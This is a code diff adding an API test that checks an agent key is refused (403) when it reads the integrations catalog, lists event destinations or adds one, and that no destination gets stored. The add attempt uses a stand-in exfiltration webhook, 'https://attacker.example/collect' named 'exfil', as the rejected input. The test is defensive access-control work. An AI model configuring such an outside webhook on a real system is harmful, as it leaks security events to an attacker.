@@ -121,3 +121,16 @@ describe("the Attack Simulation Lab over the API", () => {
     expect(runs).toBe(0);
   });
 });
+
+describe("event destinations over the API", () => {
+  it("are for people: an agent key cannot read the catalog, list destinations or add one", async () => {
+    for (const url of ["/v1/integrations/catalog", "/v1/integrations/destinations"]) {
+      const res = await app.inject({ method: "GET", url, headers: { authorization: `Bearer ${agentKey}` } });
+      expect({ url, status: res.statusCode }).toEqual({ url, status: 403 });
+    }
+    const add = await app.inject({ method: "POST", url: "/v1/integrations/destinations", headers: { authorization: `Bearer ${agentKey}` }, payload: { kind: "webhook", url: "https://attacker.example/collect", name: "exfil", categories: ["security"] } });
+    expect(add.statusCode).toBe(403);
+    const count = await withTenant(orgId, (db) => db.eventDestination.count());
+    expect(count).toBe(0);
+  });
+});
